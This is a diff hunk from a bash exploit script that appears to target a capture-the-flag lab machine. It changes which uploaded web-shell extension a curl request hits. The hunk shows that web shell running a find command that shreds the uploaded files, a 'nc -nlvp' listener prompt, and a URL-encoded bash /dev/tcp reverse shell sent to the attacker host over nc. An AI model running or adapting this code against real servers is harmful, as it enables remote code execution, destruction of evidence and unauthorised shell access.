@@ -47,7 +47,7 @@ for extension in "${file_extension[@]}"; do
       echo -e "${yellowColour}[*]${endColour}${yellowColour}Success fully deleted.${endColour}"
       echo -e "${yellowColour}[!]Please open another terminal and start listening to the reverse shell with the following command${endColour} ${redColour}nc -nlvp 5001${endColour}"
       sleep 20
-      curl -s 'http://10.10.45.41/uploads/cmd.php5?cmd=find%20.%20-maxdepth%201%20-type%20f%20-name%20%22cmd*%22%20%21%20-name%20"'$valid_extention'"%20-exec%20shred%20-u%20%7B%7D%20%5C%3B'
+      curl -s 'http://10.10.45.41/uploads/cmd${extension}?cmd=find%20.%20-maxdepth%201%20-type%20f%20-name%20%22cmd*%22%20%21%20-name%20"'$valid_extention'"%20-exec%20shred%20-u%20%7B%7D%20%5C%3B'
       echo -e "${yellowColour}[*]triyng reverse shell${endColour}"
       shell=$(echo -e "GET /uploads/cmd${extension}?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.2.39.16%2F5001%200%3E%261%27 HTTP/1.0\r\n\r\n" | nc 10.10.45.41 80)
       break
